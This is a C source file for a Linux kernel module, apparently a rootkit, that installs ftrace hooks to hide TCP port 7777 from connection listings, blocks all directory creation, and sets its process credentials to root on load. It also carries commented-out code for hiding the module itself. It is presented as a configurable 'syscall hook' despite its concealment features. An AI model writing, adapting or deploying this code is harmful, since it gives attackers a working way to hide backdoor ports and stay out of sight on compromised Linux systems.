/*MIT License

Copyright (c) 2025 nullpointer(malefax)
Just a slave of God
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/tcp.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/init.h>
#undef pr_fmt
#define pr_fmt(fmt) "%s : " fmt,__func__

// TO ENABLE HOOK JUST CHANGE MACRO VALUE TO 1
#define TCP_HOOK_IS_ENABLED 1
#define MKDIR_HOOK_IS_ENABLED 1
// change your desired port number
#define PORT_HIDING ((const unsigned int)7777)

// Version-specific adjustments
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
#define FTRACE_REGS_STRUCT ftrace_regs
#else
#define FTRACE_REGS_STRUCT pt_regs
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long retval;

    if (register_kprobe(&kp) < 0) return 0;
    retval = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif


struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to resolve %s\n", hook->name);
        return -ENOENT;
    }
#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

// Updated function signature to use FTRACE_REGS_STRUCT
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct FTRACE_REGS_STRUCT *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    #if USE_FENTRY_OFFSET
    regs->pc = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->pc = (unsigned long) hook->function;
#endif
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED
					| FTRACE_OPS_FL_RECURSION
					| FTRACE_OPS_FL_IPMODIFY; 

    err = ftrace_set_filter(&hook->ops,(unsigned char *) hook->name, strlen(hook->name), 0);
    if (err) {
        printk(KERN_ERR "ftrace_set_filter failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "register_ftrace_function failed: %d\n", err);
        //ftrace_set_filter(&hook->ops,NULL, 0, 1);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_ERR "unregister_ftrace_function failed: %d\n", err);
    err = ftrace_set_filter(&hook->ops, NULL, 0, 1);
    if (err)
        printk(KERN_ERR "ftrace_set_filter failed: %d\n", err);
}

#if (TCP_HOOK_IS_ENABLED > 0)
typedef asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,void *v);
typedef asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq,void *v);
static   orig_tcp4_seq_show tcp4;
static   orig_tcp6_seq_show tcp6;
static asmlinkage long  hook_tcp4_seq_show(struct seq_file *seq,void *v){

    long ret;
    struct sock *sk = v;
    if (sk !=(struct sock *)0x1 && sk->sk_num == PORT_HIDING)
    {
        pr_info("Port successfully hide\n");
        return 0;
    }
    ret=tcp4(seq,v);
    return ret;
}
static asmlinkage long  hook_tcp6_seq_show(struct seq_file *seq,void *v){

    long ret;
    struct sock *sk = v;
    if (sk !=(struct sock *)0x1 && sk->sk_num == PORT_HIDING)
    {
        pr_info("Port successfully hide\n");
        return 0;
    }
    ret=tcp6(seq,v);
    return ret;
}
#endif
#if (MKDIR_HOOK_IS_ENABLED > 0)
typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
static orig_mkdir_t orig_mkdir;
/*static long hook_mkdir(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->regs[1];  
    char path[256];
    printk(KERN_INFO "Attempting to create directory: %s\n", path);
    if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
        printk(KERN_INFO "Directory creation blocked: %s\n", path);
    }
    return -EACCES;
}*/
static long hook_mkdir(const struct pt_regs *regs)
{
    int dfd = regs->regs[0];
    const char __user *pathname = (const char __user *)regs->regs[1];  
    char path[256];
    
    // Clear the path array to ensure it's properly initialized
    memset(path, 0, sizeof(path));
    
    // Copy data from user-space into path buffer
    if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
  printk(KERN_INFO "Attempting to create directory (dfd=%d): %s\n", dfd, path);
        printk(KERN_INFO "Directory creation blocked: %s\n", path);
    }

    
    return -EACCES; // Block the mkdir syscall
}

#endif
static struct ftrace_hook hooks[] = {
#if ( MKDIR_HOOK_IS_ENABLED > 0)
    HOOK("__arm64_sys_mkdirat", hook_mkdir, &orig_mkdir),
#endif
#if (TCP_HOOK_IS_ENABLED > 0)
    HOOK("tcp4_seq_show" ,hook_tcp4_seq_show , &tcp4),
    HOOK("tcp6_seq_show" ,hook_tcp6_seq_show , &tcp6),
#endif    
};
static void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static int __init mkdir_monitor_init(void)
{
    int err;
    size_t i;
    rootmagic();

    // Do kernel module hiding
//    list_del_init(&__this_module.list);
  //  kobject_del(&THIS_MODULE->mkobj.kobj);

    
    

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
#if (TCP_HOOK_IS_ENABLED > 0 && MKDIR_HOOK_IS_ENABLED > 0) 
    pr_info("PORT_HIDE: Loaded\n");
    pr_info("mkdir_monitor: Loaded\n");
    return 0;
#endif    

#if(TCP_HOOK_IS_ENABLED > 0)     
    pr_info("PORT_HIDE: Loaded\n");
    return 0;
#endif
 
#if(MKDIR_HOOK_IS_ENABLED > 0)
    pr_info("mkdir_monitor: Loaded\n");
    return 0;
#endif    

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

static void __exit mkdir_monitor_exit(void)
{
    size_t i;

    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove_hook(&hooks[i]);
#if (TCP_HOOK_IS_ENABLED>0 && MKDIR_HOOK_IS_ENABLED > 0)
    pr_info("mkdir_monitor: Unloaded\n");
    pr_info("PORT_HIDE: Unloaded\n");     
#endif
 
#if (TCP_HOOK_IS_ENABLED>0 && !(MKDIR_HOOK_IS_ENABLED>0))
    pr_info("PORT_HIDE: Unloaded\n");
#endif
 
#if (MKDIR_HOOK_IS_ENABLED >0 && !(TCP_HOOK_IS_ENABLED))
    pr_info("mkdir_monitor: Unloaded\n");
#endif
}

module_init(mkdir_monitor_init);
module_exit(mkdir_monitor_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("syscall hook via ftrace");
MODULE_AUTHOR("malefax");

